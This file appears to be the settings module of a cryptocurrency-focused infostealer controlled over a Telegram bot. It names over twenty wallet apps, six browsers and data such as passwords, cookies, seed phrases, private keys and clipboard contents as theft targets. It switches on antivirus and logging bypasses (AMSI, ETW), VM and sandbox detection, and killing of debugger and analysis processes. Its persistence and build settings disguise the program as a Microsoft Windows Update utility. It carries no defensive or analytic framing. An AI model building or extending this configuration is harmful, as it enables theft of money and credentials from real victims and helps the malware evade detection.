# telegram c2 settings
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Get from @BotFather
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"      # Get from @userinfobot

# behaviour settings
ENABLE_HIDDEN_CONSOLE = True        # Run with no visible window
ENABLE_STARTUP_PERSISTENCE = False   # Add to startup (use carefully)
ENABLE_EVASION_TECHNIQUES = True    # Anti-analysis & bypasses
ENABLE_ANTI_ANALYSIS = True         # VM/sandbox detection
ENABLE_FILELESS_EXECUTION = False   # Memory-only execution (advanced)

WALLET_TARGETS = {
    "METAMASK": True,
    "EXODUS": True, 
    "ATOMIC": True,
    "ELECTRUM": True,
    "PHANTOM": True,
    "COINBASE_WALLET": True,
    "TRUST_WALLET": True,
    "LEDGER_LIVE": True,
    "TREZOR_SUITE": True,
    "BINANCE_CHAIN": True,
    "SOLANA_WALLETS": True,
    "POLKADOT_JS": True,
    "AVALANCHE_WALLET": True,
    "POLYGON_WALLET": True,
    "ARBITRUM_WALLET": True,
    "OPTIMISM_WALLET": True,
    "COSMOS_WALLETS": True,
    "TERRA_STATION": True,
    "NANSEN_WALLET": True,
    "MYETHERWALLET": True,
    "MYCRYPTO": True,
    "GUARDA_WALLET": True,
    "EXCHANGE_DESKTOPS": True,
    "WALLET_DAT_FILES": True,
    "KEYSTORE_FILES": True,
}

BROWSER_TARGETS = {
    "CHROME": True,
    "BRAVE": True, 
    "EDGE": True,
    "FIREFOX": True,
    "OPERA": True,
    "VIVALDI": True,
}

DATA_TARGETS = {
    "PASSWORDS": True,
    "COOKIES": True,
    "AUTOFILL": True,
    "CREDIT_CARDS": False,  # Disabled for crypto focus
    "BROWSING_HISTORY": False,
    "BOOKMARKS": False,
    "DOWNLOAD_HISTORY": False,
    "EXTENSION_DATA": True,  # Important for wallet extensions
}

EVASION_CONFIG = {
    "KILL_ANALYSIS_TOOLS": True,
    "BYPASS_AMSI": True,
    "BYPASS_ETW": True, 
    "BYPASS_WLDP": True,
    "ANTI_DEBUG": True,
    "ANTI_VM": True,
    "SLEEP_OBFUSCATION": True,
    "SANDBOX_DETECTION": True,
    "PROCESS_HOLLOWING": False,  # Advanced - use carefully
}

PERSISTENCE_CONFIG = {
    "STARTUP_FOLDER": True,
    "SCHEDULED_TASKS": True,
    "REGISTRY_RUN": False,  # More detectable
    "SERVICE_INSTALL": False,  # Requires admin
    "TASK_NAME": "WindowsUpdateTask",
    "SERVICE_NAME": "WindowsUpdateService",
}

EXFIL_CONFIG = {
    "USE_TELEGRAM": True,
    "USE_DISCORD_WEBHOOK": False,
    "USE_EMAIL": False,
    "USE_FTP": False,
    "COMPRESS_DATA": True,
    "ENCRYPT_DATA": True,
    "CHUNK_SIZE": 4000,  # Telegram message limit
    "MAX_FILE_SIZE": 50 * 1024 * 1024,  # 50MB max
}

CRYPTO_CONFIG = {
    "SCAN_FOR_SEED_PHRASES": True,
    "SCAN_FOR_PRIVATE_KEYS": True,
    "EXTRACT_KEYSTORE_FILES": True,
    "FIND_WALLET_DAT": True,
    "CAPTURE_SCREENSHOTS": True,  # If wallets found
    "GRAB_CLIPBOARD": True,  # Crypto addresses often copied
    "TARGET_DEFI_APPS": True,
    "SCAN_FOR_NFT_KEYS": True,
    "EXCHANGE_SESSION_HIJACK": True,
}

FILE_PATTERNS = {
    "WALLET_FILES": [
        "*.dat", "wallet.dat", "*.wallet", "*.json", "*.keystore",
        "*.aes", "*.key", "*.backup", "*.seed", "*.mnemonic"
    ],
    "CONFIG_FILES": [
        "*.config", "*.conf", "*.yml", "*.yaml", "*.ini"
    ],
    "LOG_FILES": [
        "*.log", "*.ldb", "*.log.*"
    ]
}

BLACKLIST_PROCESSES = [
    "procmon.exe", "procmon64.exe", "wireshark.exe", 
    "processhacker.exe", "processhacker2.exe", "x32dbg.exe",
    "x64dbg.exe", "ollydbg.exe", "idaq.exe", "ida64.exe",
    "immunitydebugger.exe", "windbg.exe", "joeboxcontrol.exe",
    "sandboxierpcss.exe", "sandboxiedcomlaunch.exe", 
    "vboxservice.exe", "vboxtray.exe", "vmwaretray.exe",
    "vmwareuser.exe", "prl_tools_service.exe", "qemu-ga.exe"
]

SANDBOX_THRESHOLDS = {
    "MIN_RAM_GB": 4.0,
    "MIN_CPU_CORES": 2,
    "MIN_DISK_GB": 100,
    "MIN_PROCESSES": 80,
    "MIN_UPTIME_MINUTES": 10,
    "MAX_VM_INDICATORS": 2
}

ADVANCED_CONFIG = {
    "SLEEP_DELAY": 0, 
    "MAX_EXECUTION_TIME": 300,  
    "MEMORY_CLEANUP": True,
    "ERROR_LOGGING": False, 
    "SELF_DESTRUCT": False, 
    "MUTEX_CHECK": True,  
}

BUILD_CONFIG = {
    "ICON_PATH": "icon.ico",  
    "UPX_COMPRESSION": True,  
    "OBFUSCATE_CODE": False,  
    "FILE_VERSION": "1.0.0.0",
    "PRODUCT_NAME": "Windows Update Utility",
    "COMPANY_NAME": "Microsoft Corporation",
    "COPYRIGHT": "© Microsoft Corporation. All rights reserved.",
}

DEBUG_CONFIG = {
    "VERBOSE_LOGGING": False,  # Set to True for testing
    "DRY_RUN": False,  
    "TEST_MODE": False,  
}